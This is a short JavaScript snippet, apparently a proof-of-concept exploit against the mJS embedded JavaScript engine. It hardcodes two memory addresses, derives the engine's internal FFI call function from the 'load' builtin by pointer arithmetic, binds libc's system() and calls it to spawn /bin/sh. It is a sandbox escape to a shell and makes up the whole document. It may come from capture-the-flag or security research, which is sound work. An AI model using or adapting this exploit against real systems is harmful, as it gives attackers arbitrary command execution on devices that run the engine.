let mjs_load = 0x5555555594c0;
let mjs_ffi_call = 0x555555560110;

let system = (load + (mjs_ffi_call - mjs_load))('int system(char *)'); 
system('/bin/sh');